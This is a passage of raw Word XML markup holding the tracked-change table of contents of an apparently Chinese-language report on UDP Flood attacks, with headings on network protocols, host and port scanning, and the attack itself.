          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="72" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="73" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522606"</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1.4</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任务完成情况</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522606 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="74" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2A6AEB24" w14:textId="7895A038" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="75" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="76" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522607"</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UDP Flood攻击相关理论</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522607 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="77" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="62CB9A8B" w14:textId="2B4085C3" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="78" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="79" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522608"</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2.1</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UDP Flood攻击相关网络协议</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522608 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="80" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="37F4B7DD" w14:textId="225B3FD7" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="81" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="82" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522609"</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2.1.1</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ARP协议</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522609 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="83" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="423E6C4E" w14:textId="076369DD" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="84" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="85" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522610"</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2.1.2</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ICMP协议</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522610 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="86" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6FCDD010" w14:textId="6987EF9C" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="87" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="88" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522611"</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2.1.3</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IP协议</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522611 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="89" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="45B3ECF3" w14:textId="1A32D8C7" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="90" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="91" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522612"</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2.1.4</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UDP协议</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522612 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="92" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2295F8ED" w14:textId="207B4706" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="93" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="94" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522613"</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2.2</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UDP Flood攻击相关技术</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522613 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="95" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>6</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E7B5CFC" w14:textId="7F3CBADB" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="96" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="97" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522614"</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2.2.1</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主机扫描</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522614 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="98" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>6</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0DAB14EE" w14:textId="26E6CFE1" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="99" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="100" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522615"</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2.2.2</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UDP端口扫描</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522615 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="101" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>7</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="774E98CB" w14:textId="76951DB4" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="102" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="103" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522616"</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2.2.3</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UDP Flood攻击</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522616 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="104" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1D4895A4" w14:textId="1B7717CC" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
